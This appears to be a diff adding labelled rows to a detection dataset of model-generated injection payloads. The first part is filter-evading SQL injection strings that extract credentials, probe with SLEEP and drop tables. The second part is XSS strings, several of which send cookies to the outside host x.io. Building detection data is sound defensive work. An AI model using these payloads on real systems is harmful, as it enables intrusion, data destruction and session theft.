+']%0d%0Ao/**/R%0d%0A1=2%0D%0a/*X*/,1,sqli,codellama
+""") A/**/N/**/D (S/**/E/**/L/**/E/**/C/**/T COUNT(*) F/**/R/**/O/**/M tokens)>0#",1,sqli,codellama
+%2527%2520uNiOn%2520sElEcT%2520NuLl%252CnUlL%252cNuLl%252523,1,sqli,codellama
+""")	A/**/N/**/D	0<1	/*x*/",1,sqli,codellama
+%2527%2529%252509AND%2525090%253C1%252509%252F%252Ax%252A%252F,1,sqli,codellama
+'); dRoP TaBlE AdMiN#,1,sqli,codellama
+"""/**/A/**/n/**/D/**/''=''/**//*X*/",1,sqli,codellama
+"'%0aUNION%0aSELECT%0aNULL,NULL--%0a-",1,sqli,codellama
+""")%0aOr%0A0<1%0A-- -",1,sqli,codellama
+""") Or 1=1 lImIt 1#",1,sqli,codellama
+%2560%252509O%252F%252A%252A%252FR%252509%2527a%2527%253D%2527a%2527%252509%2523,1,sqli,codellama
+%2527%2529%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520customers%2529%253E0--%2520,1,sqli,codellama
+""")%09UNION%09SELECT%09name,pwd,role,last_name,status%09FROM%09users--%09-",1,sqli,codellama
+"'] U/**/n/**/I/**/o/**/N S/**/e/**/L/**/e/**/C/**/t nUlL,NuLl,nUlL,NuLl-- -",1,sqli,codellama
+')%0d%0AaNd%0D%0a0<1%0d%0A-- -,1,sqli,codellama
+%2527%2509OR%2509%2527%2527%253D%2527%2527%2509%252F%252Ax%252A%252F,1,sqli,codellama
+%2522%252BAND%252B%2527a%2527%253D%2527a%2527%252B--%2520-,1,sqli,codellama
+'%0aAND%0a(SELECT%0aCOUNT(*)%0aFROM%0aaccounts)>0/*x*/,1,sqli,codellama
+'/**/Or/**/0<1/**/-- ,1,sqli,codellama
+']%09Or%091=1%09-- -,1,sqli,codellama
+%2522%252BA%252F%252A%252A%252FN%252F%252A%252A%252FD%252B1%253D1%252B%252523,1,sqli,codellama
+']	Or	1 bEtWeEn 0 aNd 9	/*x*/,1,sqli,codellama
+%2560%2520AND%2520extractvalue%25281%252Cconcat%25280x7e%252C%2528SELECT%2520role%2520FROM%2520users%2520LIMIT%25201%2529%2529%2529,1,sqli,codellama
+""" A/**/N/**/D (S/**/E/**/L/**/E/**/C/**/T COUNT(*) F/**/R/**/O/**/M sessions)>0--",1,sqli,codellama
+%2560%253B%2520S/**/E/**/L/**/E/**/C/**/T%2520S/**/L/**/E/**/E/**/P%25285%2529%252523,1,sqli,codellama
+'%09OR%091=1%09--/**/-,1,sqli,codellama
+""")+AnD+0<1+#",1,sqli,codellama
+%2560%252F%252A%252A%252FOR%252F%252A%252A%252F1%253D1%252F%252A%252A%252F--,1,sqli,codellama
+"""/**/AnD/**/1/**/BeTwEeN/**/0/**/AnD/**/9/**/--",1,sqli,codellama
+` aNd 1 bEtWeEn 0 aNd 9 #,1,sqli,codellama
+%2560%2520aNd%2520%2528SeLeCt%2520cOuNt%2528%252A%2529%2520FrOm%2520aDmIn%2529%253E0--%2520-,1,sqli,codellama
+%2527%2509oR%25091%253d2%2509%252523,1,sqli,codellama
+%2522%2529%252509A%252F%252A%252A%252FN%252F%252A%252A%252FD%2525091%2520BETWEEN%25200%2520A%252F%252A%252A%252FN%252F%252A%252A%252FD%25209%252509--,1,sqli,codellama
+%2522%252509OR%252509%2527a%2527%253D%2527a%2527%252509--,1,sqli,codellama
+""");%0aS/**/E/**/L/**/E/**/C/**/T%0aS/**/L/**/E/**/E/**/P(5)#",1,sqli,codellama
+%2527%255D%252BAND%252B%2527%2527%253D%2527%2527%252B%2523,1,sqli,codellama
+""") O/**/r (S/**/e/**/L/**/e/**/C/**/t pWd f/**/R/**/o/**/M AcCoUnTs wHeRe pWd=681)=555",1,sqli,codellama
+`%0aA/**/N/**/D%0a0<1%0a--%0a,1,sqli,codellama
+""";%0aSELECT%0aSLEEP(5)/*x*/",1,sqli,codellama
+%2522%25250d%25250aO/**/R%25250d%25250a0%253C1%25250d%25250a%252F%252Ax%252A%252F,1,sqli,codellama
+%2522%2529%25250aOR%25250a1%253D2%25250a--%252B,1,sqli,codellama
+']/**/AND/**/1%0aBETWEEN%0a0%0aAND%0a9/**/--,1,sqli,codellama
+'	A/**/N/**/D	''=''	%23,1,sqli,codellama
+'); dRoP TaBlE StAfF-- ,1,sqli,codellama
+%2560%2520AND%25200%253C1%2520%2523,1,sqli,codellama
+']; dRoP TaBlE AdMiN%23,1,sqli,codellama
+%2522%2529%25250d%25250aAND%25250d%25250a1%253D1%25250d%25250a%252F%252Ax%252A%252F,1,sqli,codellama
+%2527%2529%252F%252A%252A%252FOR%252F%252A%252A%252F%2527%2527%253D%2527%2527%252F%252A%252A%252F--%2520-,1,sqli,codellama
+%2527%255D%25250d%25250AoR%25250d%25250A0%253C1%25250D%25250a--,1,sqli,codellama
+%2527%2520UNION%2520SELECT%2520NULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL--,1,sqli,codellama
+%2560%252509AND%2525091%252509LIKE%2525091%252509%252523,1,sqli,codellama
+%2527%252509oR%252509%2527%2527%253D%2527%2527%252509--%2520-,1,sqli,codellama
+'+O/**/R+1=1+LIMIT+1--+,1,sqli,codellama
+%2522%2529%252F%252A%252A%252FA%252F%252A%252A%252FN%252F%252A%252A%252FD%252F%252A%252A%252F0%253C1%252F%252A%252A%252F--%2520,1,sqli,codellama
+%2527%2529%2509Or%25091%2520bEtWeEn%25200%2520aNd%25209%2509%252523,1,sqli,codellama
+"""	O/**/R	1 BETWEEN 0 A/**/N/**/D 9	/*x*/",1,sqli,codellama
+%2527%2529%25250d%25250AaNd%25250D%25250a1%2520BeTwEeN%25200%2520AnD%25209%25250d%25250A--,1,sqli,codellama
+""")%0aAnD%0a1=2%0a--",1,sqli,codellama
+"` u/**/N/**/i/**/O/**/n s/**/E/**/l/**/E/**/c/**/T NuLl,nUlL,NuLl,nUlL,NuLl,nUlL#",1,sqli,codellama
+']	Or	1=1	#,1,sqli,codellama
+']+A/**/N/**/D+1%0aLIKE%0a1+/*x*/,1,sqli,codellama
+""")/**/A/**/N/**/D/**/(S/**/E/**/L/**/E/**/C/**/T/**/COUNT(*)/**/F/**/R/**/O/**/M/**/staff)>0%23",1,sqli,codellama
+']	AnD	0<1	/*X*/,1,sqli,codellama
+'/**/AND/**/(SELECT/**/COUNT(*)/**/FROM/**/members)>0--/**/-,1,sqli,codellama
+`; SeLeCt sLeEp(5)#,1,sqli,codellama
+'] A/**/N/**/D (S/**/E/**/L/**/E/**/C/**/T COUNT(*) F/**/R/**/O/**/M admin)>0/*x*/,1,sqli,codellama
+%2527%2520aNd%2520%2528SeLeCt%2520cOuNt%2528%252A%2529%2520FrOm%2520aDmIn%2529%253E0%2523,1,sqli,codellama
+';+D/**/R/**/O/**/P+TABLE+sessions%23,1,sqli,codellama
+"""); d/**/R/**/o/**/P TaBlE SeSsIoNs%23",1,sqli,codellama
+""")/**/AND/**/1=1/**//*x*/",1,sqli,codellama
+'	aNd	1 lIkE 1	%23,1,sqli,codellama
+""";%09SELECT%09SLEEP(5)--%09",1,sqli,codellama
+']%0aAnD%0a(sElEcT%0aCoUnT(*)%0afRoM%0aOrDeRs)>0#,1,sqli,codellama
+']%0aOR%0a2>1%0a--%09-,1,sqli,codellama
+"""); S/**/E/**/L/**/E/**/C/**/T S/**/L/**/E/**/E/**/P(5)-- ",1,sqli,codellama
+""")	A/**/n/**/D	0<1	-- -",1,sqli,codellama
+%2527%255D%25250d%25250aOR%25250d%25250a1%253D2%25250d%25250a--%2520,1,sqli,codellama
+%2527%25250aAND%25250a1%253D2%25250a--%2520,1,sqli,codellama
+%2527%2529%2520OR%2520%2528SELECT%2520token%2520FROM%2520admin%2520WHERE%2520token%253D860%2529%253D934,1,sqli,codellama
+%2522%2529%252509AND%2525091%2520BETWEEN%25200%2520AND%25209%252509%2523,1,sqli,codellama
+']/**/aNd/**/''=''/**/-- ,1,sqli,codellama
+'	A/**/N/**/D	'a'='a'	#,1,sqli,codellama
+%2527%2529%253B%2520S%252F%252A%252A%252FE%252F%252A%252A%252FL%252F%252A%252A%252FE%252F%252A%252A%252FC%252F%252A%252A%252FT%2520S%252F%252A%252A%252FL%252F%252A%252A%252FE%252F%252A%252A%252FE%252F%252A%252A%252FP%25285%2529%252523,1,sqli,codellama
+%2560%253B%252BDROP%252BTABLE%252Busers--%252B,1,sqli,codellama
+%2527%2529%2520UNION%2520SELECT%2520NULL%252CNULL%252CNULL--%2520-,1,sqli,codellama
+']; sElEcT SlEeP(5)--,1,sqli,codellama
+`/**/O/**/R/**/1=1/**/LIMIT/**/1--/**/-,1,sqli,codellama
+`%09oR%091=1%09%23,1,sqli,codellama
+')%09Or%092>1%09-- -,1,sqli,codellama
+']%09Or%091=1%09#,1,sqli,codellama
+%2527%2529%2520UnIoN%2520SeLeCt%2520nUlL%252CNuLl%252CnUlL%252F%252Ax%252A%252F,1,sqli,codellama
+')%0aO/**/R%0a1=2%0a#,1,sqli,codellama
+`/**/AnD/**/1=1/**/--,1,sqli,codellama
+']+AND+''=''+--,1,sqli,codellama
+%2522%253B%2520D%252F%252A%252A%252FR%252F%252A%252A%252FO%252F%252A%252A%252FP%2520TABLE%2520o%252F%252A%252A%252Frders%2523,1,sqli,codellama
+%2522%2529%252509O/**/R%2525091%253D2%252509--,1,sqli,codellama
+""") A/**/N/**/D (S/**/E/**/L/**/E/**/C/**/T COUNT(*) F/**/R/**/O/**/M customers)>0-- -",1,sqli,codellama
+%2522%2529%25250aAND%25250a0%253C1%25250a%252F%252Ax%252A%252F,1,sqli,codellama
+'%0aO/**/R%0a1 BETWEEN 0 A/**/N/**/D 9%0a-- ,1,sqli,codellama
+%2527%25250d%25250aA/**/N/**/D%25250d%25250a1%2520LIKE%25201%25250d%25250a--%2520-,1,sqli,codellama
+%2560%252BOR%252B1%253D2%252B--%2520,1,sqli,codellama
+')%0aOr%0A2>1%0A%23,1,sqli,codellama
+']/**/A/**/N/**/D/**/0<1/**/--,1,sqli,codellama
+""")%0d%0aO/**/R%0d%0a1=1%0d%0a%23",1,sqli,codellama
+')+AnD+'a'='a'+#,1,sqli,codellama
+"` uNiOn sElEcT UiD,StAtUs,tOkEn fRoM UsErS-- ",1,sqli,codellama
+%2522%25250d%25250aAND%25250d%25250a1%2520LIKE%25201%25250d%25250a--%2520,1,sqli,codellama
+""" o/**/R (s/**/E/**/l/**/E/**/c/**/T NaMe f/**/R/**/o/**/M SeSsIoNs wHeRe nAmE=530)=320",1,sqli,codellama
+%2527%253B%2520SELECT%2520SLEEP%25285%2529--%2520-,1,sqli,codellama
+')%09O/**/R%090<1%09%23,1,sqli,codellama
+"""%09o/**/R%090<1%09#",1,sqli,codellama
+%2522%2520OR%25201%253D1%2520LIMIT%25201%2523,1,sqli,codellama
+""")%09O/**/R%090<1%09#",1,sqli,codellama
+'];%0aD/**/R/**/O/**/P%0aTABLE%0aadmin--,1,sqli,codellama
+%2560%252BOR%252B%2527%2527%253D%2527%2527%252B%2523,1,sqli,codellama
+%2527%2529%252509AND%2525091%253D1%252509--%252F%252A%252A%252F-,1,sqli,codellama
+'%0aA/**/N/**/D%0a'a'='a'%0a/*x*/,1,sqli,codellama
+'];%09sElEcT%09SlEeP(5)%23,1,sqli,codellama
+"""%0aAND%0a(SELECT%0aCOUNT(*)%0aFROM%0aaccounts)>0#",1,sqli,codellama
+'%0D%0aOr%0D%0a0<1%0d%0A%23,1,sqli,codellama
+"""/**/A/**/N/**/D/**/1=1/**/#",1,sqli,codellama
+'%09oR%09''=''%09--,1,sqli,codellama
+%2522%2529%253b%2520dRoP%2520TaBlE%2520CuStOmErS%2523,1,sqli,codellama
+"""+A/**/N/**/D+1 LIKE 1+--",1,sqli,codellama
+'); s/**/E/**/l/**/E/**/c/**/T S/**/l/**/E/**/e/**/P(5)-- ,1,sqli,codellama
+""")%09O/**/R%090<1%09-- -",1,sqli,codellama
+"""%09OR%091%0aLIKE%0a1%09--%0a",1,sqli,codellama
+%2527%2529%252BUNION%252BSELECT%252BNULL%252CNULL%252CNULL%252CNULL%252CNULL--,1,sqli,codellama
+`; D/**/R/**/O/**/P TABLE users-- -,1,sqli,codellama
+']%0d%0AaNd%0D%0a''=''%0d%0A/*x*/,1,sqli,codellama
+""") AnD (sElEcT CoUnT(*) fRoM AcCoUnTs)>0-- -",1,sqli,codellama
+%2522%2520oR%25201%253d1%2520%252523,1,sqli,codellama
+"""	O/**/R	''=''	%23",1,sqli,codellama
+%2527%255D%2520O%252F%252A%252A%252FR%25200%253C1%2520%252523,1,sqli,codellama
+') A/**/n/**/D (s/**/E/**/l/**/E/**/c/**/T CoUnT(*) f/**/R/**/o/**/M AcCoUnTs)>0-- ,1,sqli,codellama
+']%0aA/**/N/**/D%0a1=2%0a/*x*/,1,sqli,codellama
+%2527%252509OR%252509%2527a%2527%253D%2527a%2527%252509%252523,1,sqli,codellama
+%2522%2529%252509AND%2525090%253C1%252509%252F%252Ax%252A%252F,1,sqli,codellama
+""";%0aSeLeCt%0AsLeEp(5)#",1,sqli,codellama
+%2560%25250aOR%25250a1%2520BETWEEN%25200%2520AND%25209%25250a%252F%252Ax%252A%252F,1,sqli,codellama
+%2527%2529%252509AND%2525091%253D2%252509--%2520-,1,sqli,codellama
+')+O/**/r+0<1+%23,1,sqli,codellama
+%2527%2529%2520O%252F%252A%252A%252FR%25201%253D1%2520LIMIT%25201%252F%252Ax%252A%252F,1,sqli,codellama
+%2522%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520credentials%2529%253E0%252523,1,sqli,codellama
+%2522%252F%252A%252A%252FOR%252F%252A%252A%252F%2527a%2527%253D%2527a%2527%252F%252A%252A%252F--%2520-,1,sqli,codellama
+%2522%253B%2520DrOp%2520tAbLe%2520uSeRs--%2520-,1,sqli,codellama
+` A/**/N/**/D (S/**/E/**/L/**/E/**/C/**/T COUNT(*) F/**/R/**/O/**/M tokens)>0--,1,sqli,codellama
+`/**/Or/**/0<1/**/--+-,1,sqli,codellama
+""")%0aA/**/N/**/D%0a1=1%0a-- ",1,sqli,codellama
+"') UnIoN SeLeCt eMaIl,uId,lAsT_NaMe,iD,NaMe fRoM SeSsIoNs%23",1,sqli,codellama
+%2522%2529%25250aOR%25250a0%253C1%25250a%252523,1,sqli,codellama
+%2527%255D%25250d%25250AaNd%25250D%25250a2%253e1%25250d%25250A%252f%252Ax%252A%252f,1,sqli,codellama
+%2560%25250d%25250aO/**/R%25250d%25250a0%253C1%25250d%25250a--,1,sqli,codellama
+']+AnD+1+LiKe+1+/*x*/,1,sqli,codellama
+`%0D%0aAnD%0d%0A0<1%0D%0a/*X*/,1,sqli,codellama
+'/**/AND/**/1%0aBETWEEN%0a0%0aAND%0a9/**/#,1,sqli,codellama
+`%0d%0aOR%0d%0a1%09LIKE%091%0d%0a/*x*/,1,sqli,codellama
+'+A/**/N/**/D+1=1+--+-,1,sqli,codellama
+%2527%255D%25250d%25250aO%252F%252A%252A%252FR%25250d%25250a0%253C1%25250d%25250a--%2520-,1,sqli,codellama
+']%0aO/**/r%0A2>1%0A-- ,1,sqli,codellama
+')%0d%0aO/**/R%0d%0a0<1%0d%0a--,1,sqli,codellama
+""")%0d%0AaNd%0D%0a'a'='a'%0d%0A#",1,sqli,codellama
+%2522%253B%2520SeLeCt%2520sLeEp%25285%2529%252523,1,sqli,codellama
+']+O/**/r+1=1+#,1,sqli,codellama
+""") O/**/r 1 lIkE 1 --",1,sqli,codellama
+%2560%252BAND%252B0%253C1%252B%2523,1,sqli,codellama
+"""	O/**/R	1 BETWEEN 0 A/**/N/**/D 9	--",1,sqli,codellama
+%2527%25250d%25250aAND%25250d%25250a2%253E1%25250d%25250a%252F%252Ax%252A%252F,1,sqli,codellama
+%2527%2529%253B%2520SELECT%2520SLEEP%25285%2529--%2520-,1,sqli,codellama
+%2527%2529%252BAND%252B1%252BLIKE%252B1%252B--%252B,1,sqli,codellama
+`%0aO/**/R%0a''=''%0a#,1,sqli,codellama
+%2522%2529%253b%2520dRoP%2520TaBlE%2520UsErS--,1,sqli,codellama
+']%09OR%091=1%09LIMIT%091--,1,sqli,codellama
+']%0aO/**/R%0a1=1%0a#,1,sqli,codellama
+` o/**/R 1=1 LiMiT 1-- ,1,sqli,codellama
+%2522%2520U/**/N/**/I/**/O/**/N%2520S/**/E/**/L/**/E/**/C/**/T%2520token%252Cuser%2520F/**/R/**/O/**/M%2520staff%252F%252Ax%252A%252F,1,sqli,codellama
+`	AND	1=2	--+-,1,sqli,codellama
+'; S/**/E/**/L/**/E/**/C/**/T S/**/L/**/E/**/E/**/P(5)-- ,1,sqli,codellama
+%2527%255D%2509OR%25091%2520LIKE%25201%2509--%2520-,1,sqli,codellama
+%2527%25250aO/**/R%25250a%2527a%2527%253D%2527a%2527%25250a%252F%252Ax%252A%252F,1,sqli,codellama
+"""%09AND%090<1%09--%0a-",1,sqli,codellama
+%2560%25250d%25250aOR%25250d%25250a%2527a%2527%253D%2527a%2527%25250d%25250a--%2520-,1,sqli,codellama
+%2527%2529%25250d%25250aA/**/N/**/D%25250d%25250a1%2520BETWEEN%25200%2520A/**/N/**/D%25209%25250d%25250a%252F%252Ax%252A%252F,1,sqli,codellama
+`+a/**/N/**/d+'A'='A'+-- -,1,sqli,codellama
+%2527%255D%2520OR%25201%253D2%2520--%2520,1,sqli,codellama
+%2522%253B%2520DROP%2520TABLE%2520staff--,1,sqli,codellama
+%2522%2526gt%253B%2526lt%253Biframe%2520oninput%253Dlocation%253D%2527%252F%252Fx.io%2527%2526gt%253B,1,xss,codellama
+%2522%253E%253Csvg%2520oninput%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
+"&lt;iframe src=""javascript:confirm(1)""&gt;",1,xss,codellama
+%253Cscript%2520onclick%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,codellama
+%2522%253E%253CDiV%2520OnErRoR%253DFeTcH%2528%2527%252F%252Fx.iO%252F%2527%252BDoCuMeNt.cOoKiE%2529%253E,1,xss,codellama
+"<BoDy oNfOcUs=""AlErT(1)"">",1,xss,codellama
+%2527%253E%253Cinput%2520onfocus%253Dalert%25281%2529%253E,1,xss,codellama
+%2527%253E%253Ciframe%2520onfocus%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
+<ScRiPt oNlOaD=PrInT()>,1,xss,codellama
+<MaRqUeE OnStArT=AlErT(DoCuMeNt.cOoKiE)>,1,xss,codellama
+%253Cbody%2520onpointerover%253Dalert%25281%2529%253E,1,xss,codellama
+%2522%253E%253Cimg%2520ontoggle%253Dprint%2528%2529%253E,1,xss,codellama
+%253Caudio%2520ontoggle%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
+'><ImG OnInPuT=PrInT()>,1,xss,codellama
+%2527%253E%253Caudio%2520onclick%253Dconfirm%25281%2529%253E,1,xss,codellama
+%2522%253E%253Cscript%2520oninput%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
+%2522%253E%253Cvideo%2520oninput%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
+'><DeTaIlS OnClIcK=FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)>,1,xss,codellama
+"""><ScRiPt oNiNpUt=lOcAtIoN='//x.iO'>",1,xss,codellama
+"""><DeTaIlS OnPoInTeRoVeR=FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)>",1,xss,codellama
+<MaRqUeE OnToGgLe=eVaL(AtOb('YwXlCnQoMsK'))>,1,xss,codellama
+%2527%253E%253Cobject%2520oninput%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+<ViDeO OnLoAd=cOnFiRm(1)>,1,xss,codellama
+%2522%253E%253Cscript%2520onpointerover%253Dprint%2528%2529%253E,1,xss,codellama
+"<BoDy oNaNiMaTiOnStArT=""aLeRt(dOcUmEnT.DoMaIn)"">",1,xss,codellama
+'&gt;&lt;details ontoggle=alert(document.domain)&gt;,1,xss,codellama
+%253Cvideo%2520ontoggle%253Dalert%25281%2529%253E,1,xss,codellama
+%253Ca%2520onpointerover%253D%2522alert%2528document.cookie%2529%2522%253E,1,xss,codellama
+'&gt;&lt;div onpointerover=location='//x.io'&gt;,1,xss,codellama
+%253Cbody%2520oninput%253D%2522print%2528%2529%2522%253E,1,xss,codellama
+%253Cvideo%2520onanimationstart%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+&lt;div onmouseover=alert(1)&gt;,1,xss,codellama
+"<DiV OnFoCuS=""eVaL(AtOb('YwXlCnQoMsK'))"">",1,xss,codellama
+'><SvG OnClIcK=AlErT(1)>,1,xss,codellama
+"""&gt;&lt;body onload=eval(atob('YWxlcnQoMSk'))&gt;",1,xss,codellama
+%2527%253E%253cScRiPt%2520oNiNpUt%253DaLeRt%2528dOcUmEnT.DoMaIn%2529%253e,1,xss,codellama
+"<BoDy oNtOgGlE=""cOnFiRm(1)"">",1,xss,codellama
+"<MaRqUeE OnFoCuS=""aLeRt(dOcUmEnT.DoMaIn)"">",1,xss,codellama
+%2522%253E%253Cdiv%2520ontoggle%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
+%2522%253E%253CImG%2520OnToGgLe%253DaLeRt%2528dOcUmEnT.CoOkIe%2529%253E,1,xss,codellama
+"&lt;marquee onload=""fetch('//x.io/'+document.cookie)""&gt;",1,xss,codellama
+"""&gt;&lt;audio onpointerover=fetch('//x.io/'+document.cookie)&gt;",1,xss,codellama
+%2527%253E%253Cdetails%2520onerror%253Dalert%25281%2529%253E,1,xss,codellama
+%253Cdetails%2520onerror%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+%2527%253E%253Cimg%2520onanimationstart%253Dprint%2528%2529%253E,1,xss,codellama
+"""><ObJeCt oNpOiNtErOvEr=lOcAtIoN='//x.iO'>",1,xss,codellama
+%2527%253E%253Cimg%2520onfocus%253Dprint%2528%2529%253E,1,xss,codellama
+%2522%253E%253Cvideo%2520onanimationstart%253Dprint%2528%2529%253E,1,xss,codellama
+%253Cvideo%2520ontoggle%253Dconfirm%25281%2529%253E,1,xss,codellama
+%253Caudio%2520ontoggle%253D%2522alert%25281%2529%2522%253E,1,xss,codellama
+%2522%253E%253Cinput%2520onfocus%253Dprint%2528%2529%253E,1,xss,codellama
+"<MaRqUeE OnAnImAtIoNsTaRt=""AlErT(DoCuMeNt.dOmAiN)"">",1,xss,codellama
+%253Caudio%2520onclick%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,codellama
+"<sCrIpT onerror=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
+"""&gt;&lt;video onpointerover=alert(document.cookie)&gt;",1,xss,codellama
+'><SvG OnAnImAtIoNsTaRt=fEtCh('//X.Io/'+dOcUmEnT.CoOkIe)>,1,xss,codellama
+'&gt;&lt;iframe onerror=alert(document.domain)&gt;,1,xss,codellama
+%253Ca%2520onerror%253D%2522confirm%25281%2529%2522%253E,1,xss,codellama
+%253cImG%2520OnAnImAtIoNsTaRt%253DpRiNt%2528%2529%253E,1,xss,codellama
+'&gt;&lt;details onclick=print()&gt;,1,xss,codellama
+<IfRaMe oNlOaD=AlErT(DoCuMeNt.cOoKiE)>,1,xss,codellama
+%253Cvideo%2520onstart%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,codellama
+"""><DeTaIlS OnPoInTeRoVeR=AlErT(DoCuMeNt.cOoKiE)>",1,xss,codellama
+%253Cbody%2520onstart%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
+%253Cimg%2520onclick%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+"""><AuDiO OnFoCuS=AlErT(1)>",1,xss,codellama
+%253CIfRaMe%2520oNiNpUt%253D%2522PrInT%2528%2529%2522%253E,1,xss,codellama
+%253Ciframe%2520onanimationstart%253Dprint%2528%2529%253E,1,xss,codellama
+&lt;object ontoggle=print()&gt;,1,xss,codellama
+%2527%253E%253Csvg%2520onerror%253Dalert%25281%2529%253E,1,xss,codellama
+%253CScRiPt%2520onclick%253D%2522alert%2528document.cookie%2529%2522%253E,1,xss,codellama
+%253Cvideo%2520onanimationstart%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,codellama
+%2527%253E%253Csvg%2520onanimationstart%253Dalert%25281%2529%253E,1,xss,codellama
+%253Cinput%2520onclick%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
+%2522%253E%253CA%2520OnStArT%253DAlErT%2528DoCuMeNt.cOoKiE%2529%253E,1,xss,codellama
+&lt;svg onload=eval(atob('YWxlcnQoMSk'))&gt;,1,xss,codellama
+<ScRiPt oNcLiCk=cOnFiRm(1)>,1,xss,codellama
+%2527%253E%253CDeTaIlS%2520OnMoUsEoVeR%253DAlErT%25281%2529%253E,1,xss,codellama
+%253Cdiv%2520onstart%253D%2522alert%2528document.cookie%2529%2522%253E,1,xss,codellama
+%2522%253E%253Cdiv%2520onfocus%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
+'&gt;&lt;details onclick=eval(atob('YWxlcnQoMSk'))&gt;,1,xss,codellama
+%2522%253E%253Cinput%2520onpointerover%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
+%253Ca%2520href%253D%2522javascript%253Aalert%2528document.domain%2529%2522%253Ex%253C%252Fa%253E,1,xss,codellama
+"<sCrIpT onload=""confirm(1)"">",1,xss,codellama
+"<InPuT OnMoUsEoVeR=""cOnFiRm(1)"">",1,xss,codellama
+%253Cscript%2520onclick%253D%2522alert%25281%2529%2522%253E,1,xss,codellama
+&lt;ImG OnClIcK=AlErT(DoCuMeNt.cOoKiE)&gt;,1,xss,codellama
+%253Cdiv%2520onmouseover%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,codellama
+%253Cscript%2520onload%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
+%253cDiV%2520OnMoUsEoVeR%253dAlErT%2528DoCuMeNt.cOoKiE%2529%253E,1,xss,codellama
+%253Cmarquee%2520ontoggle%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+'><ScRiPt oninput=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
+%253Cinput%2520onclick%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
+<BoDy oNtOgGlE=CoNfIrM(1)>,1,xss,codellama
+%253Cmarquee%2520onload%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+&lt;input onstart=confirm(1)&gt;,1,xss,codellama
+'><SvG OnClIcK=FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)>,1,xss,codellama
+"<IfRaMe oNmOuSeOvEr=""EvAl(aToB('yWxLcNqOmSk'))"">",1,xss,codellama
+"""&gt;&lt;marquee ontoggle=fetch('//x.io/'+document.cookie)&gt;",1,xss,codellama
+%253Caudio%2520onerror%253D%2522alert%2528document.domain%2529%2522%253E,1,xss,codellama
+"""&gt;&lt;object onload=eval(atob('YWxlcnQoMSk'))&gt;",1,xss,codellama
+%2527%253E%253Caudio%2520onload%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
+%253Ca%2520onstart%253D%2522alert%2528document.cookie%2529%2522%253E,1,xss,codellama
+%253Cobject%2520onstart%253Dalert%25281%2529%253E,1,xss,codellama
+<SvG OnFoCuS=PrInT()>,1,xss,codellama
+'><BoDy oNeRrOr=cOnFiRm(1)>,1,xss,codellama
+%2522%253E%253Cdiv%2520onfocus%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+%2527%253E%253Cscript%2520onclick%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+%253Cdetails%2520onfocus%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
+%253Cscript%2520onstart%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,codellama
+%253Cimg%2520onfocus%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
+'&gt;&lt;ScRiPt oNpOiNtErOvEr=lOcAtIoN='//x.iO'&gt;,1,xss,codellama
+%2522%253E%253Cscript%2520ontoggle%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
+%2522%253E%253Cmarquee%2520onerror%253Dconfirm%25281%2529%253E,1,xss,codellama
+<SvG OnErRoR=CoNfIrM(1)>,1,xss,codellama
+'><ImG OnAnImAtIoNsTaRt=cOnFiRm(1)>,1,xss,codellama
+"""><InPuT OnClIcK=CoNfIrM(1)>",1,xss,codellama
+<BoDy oNcLiCk=lOcAtIoN='//x.iO'>,1,xss,codellama
+%2527%253E%253Csvg%2520onclick%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+%253Ciframe%2520onpointerover%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+%253Csvg%2520onclick%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
+%253Cobject%2520oninput%253D%2522print%2528%2529%2522%253E,1,xss,codellama
+"<ViDeO OnFoCuS=""aLeRt(dOcUmEnT.DoMaIn)"">",1,xss,codellama
+"<BoDy oNfOcUs=""AlErT(DoCuMeNt.cOoKiE)"">",1,xss,codellama
